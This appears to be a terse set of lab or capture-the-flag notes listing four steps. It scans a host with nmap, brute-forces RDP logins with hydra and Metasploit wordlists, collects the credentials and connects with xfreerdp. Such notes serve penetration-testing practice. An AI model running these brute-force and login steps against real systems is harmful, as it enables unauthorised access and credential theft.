

- nmap -sV IP
- hydra -L /usr/share/metasploit/data/wordlists/common_users.txt -P /UNIX+PASSWRDS rdp://IP -s 3333
- collect creds 
- xfreerdp /u:user /p:password /v:IP:port 